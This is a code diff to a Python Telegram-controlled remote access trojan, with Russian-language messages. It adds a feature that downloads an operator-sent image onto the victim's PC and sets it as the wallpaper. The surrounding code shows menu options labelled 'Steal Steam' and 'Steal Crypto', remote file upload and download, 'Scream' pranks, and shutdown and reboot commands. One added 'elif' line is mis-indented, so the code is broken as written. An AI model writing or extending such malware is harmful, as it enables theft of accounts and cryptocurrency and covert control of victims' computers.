@@ -1934,7 +1934,7 @@ def start(update, context):
         [InlineKeyboardButton("📂 List Files", callback_data="listfiles")],
         [InlineKeyboardButton("📤 Upload File", callback_data="upload")],
         [InlineKeyboardButton("📥 Download File", callback_data="downloadfile")],
-        [InlineKeyboardButton("🖼️ Wallpaper", callback_data="wallpaper")],
+        [InlineKeyboardButton("🖼️ Set Wallpaper", callback_data="wallpaper_direct")],
         [InlineKeyboardButton("🎬 Scream Make", callback_data="scream")],
         [InlineKeyboardButton("🎮 Steal Steam", callback_data="steam")],
         [InlineKeyboardButton("💰 Steal Crypto", callback_data="crypto")],
@@ -2195,6 +2195,9 @@ def callback(update, context):
     elif data == "wallpaper":
         context.user_data['wallpaper_mode'] = True
         bot.send_message(chat_id, "🖼️ Enter image path:")
+    elif data == "wallpaper_direct":
+        context.user_data['awaiting_wallpaper'] = True
+        bot.send_message(chat_id, "🖼️ *Отправь картинку для установки обоев:*", parse_mode='Markdown')
     elif data == "shutdown":
         bot.send_message(chat_id, shutdown_pc())
     elif data == "reboot":
@@ -2509,6 +2512,37 @@ def callback(update, context):
     elif data == "send_log":
         bot.send_message(chat_id, send_log())
 
+def set_wallpaper_from_document(update, context):
+    """Устанавливает обои из присланной картинки (без путей)"""
+    try:
+        chat_id = update.message.chat.id
+        doc = update.message.document
+        
+        # Проверяем, что это изображение
+        if not doc.mime_type or not doc.mime_type.startswith('image/'):
+            bot.send_message(chat_id, "❌ Отправь изображение (jpg, png, bmp)")
+            return
+        
+        bot.send_message(chat_id, "⏳ Скачиваю и устанавливаю обои...")
+        
+        # Скачиваем файл
+        file = bot.get_file(doc.file_id)
+        temp_path = os.path.join(os.environ['TEMP'], doc.file_name)
+        file.download(temp_path)
+        
+        # Устанавливаем обои
+        result = set_wallpaper(temp_path)
+        bot.send_message(chat_id, result)
+        
+        # Удаляем временный файл
+        try:
+            os.remove(temp_path)
+        except:
+            pass
+            
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Ошибка: {e}")
+
 def handle_message(update, context):
     chat_id = update.message.chat.id
     text = update.message.text
@@ -2726,6 +2760,11 @@ def handle_document(update, context):
         file = bot.get_file(doc.file_id)
         file_data = file.download_as_bytearray()
         bot.send_message(chat_id, upload_file_to_pc(file_data, doc.file_name))
+
+elif context.user_data.get('awaiting_wallpaper'):
+        context.user_data['awaiting_wallpaper'] = False
+        set_wallpaper_from_document(update, context)
+        return
 
 dp.add_handler(CommandHandler("start", start))
 dp.add_handler(CallbackQueryHandler(callback))
